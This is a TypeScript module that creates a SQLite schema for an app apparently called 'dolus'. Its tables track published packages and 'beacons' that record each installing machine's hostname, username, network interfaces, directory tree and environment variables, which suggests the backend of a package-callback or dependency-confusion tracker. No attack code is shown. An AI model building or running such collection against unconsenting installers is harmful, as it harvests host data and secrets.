import Database from 'better-sqlite3';
import path from 'path';

const dbPath = process.env.DATABASE_PATH || path.join(process.cwd(), 'dolus.db');

// singleton for Next.js dev hot-reload
const g = globalThis as unknown as { _dolusDb?: Database.Database };
const db = g._dolusDb ?? new Database(dbPath);
g._dolusDb = db;

db.pragma('journal_mode = WAL');

db.exec(`
CREATE TABLE IF NOT EXISTS packages (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  name       TEXT NOT NULL UNIQUE,
  status     TEXT NOT NULL DEFAULT 'pending',
  created_at INTEGER NOT NULL DEFAULT (unixepoch())
);

CREATE TABLE IF NOT EXISTS beacons (
  id          INTEGER PRIMARY KEY AUTOINCREMENT,
  beacon_id   TEXT NOT NULL UNIQUE,
  pkg_name    TEXT NOT NULL,
  hostname    TEXT,
  username    TEXT,
  platform    TEXT,
  arch        TEXT,
  os_release  TEXT,
  interfaces  TEXT,
  dir_tree    TEXT,
  env_vars    TEXT,
  cwd         TEXT,
  last_seen   INTEGER NOT NULL DEFAULT (unixepoch()),
  created_at  INTEGER NOT NULL DEFAULT (unixepoch())
);

CREATE TABLE IF NOT EXISTS heartbeats (
  id        INTEGER PRIMARY KEY AUTOINCREMENT,
  beacon_id INTEGER NOT NULL REFERENCES beacons(id),
  ts        INTEGER NOT NULL DEFAULT (unixepoch())
);
`);

export default db;

export type Package = {
  id: number;
  name: string;
  status: 'pending' | 'published' | 'failed';
  created_at: number;
};

export type Beacon = {
  id: number;
  beacon_id: string;
  pkg_name: string;
  hostname: string | null;
  username: string | null;
  platform: string | null;
  arch: string | null;
  os_release: string | null;
  interfaces: string | null;
  dir_tree: string | null;
  env_vars: string | null;
  cwd: string | null;
  last_seen: number;
  created_at: number;
};
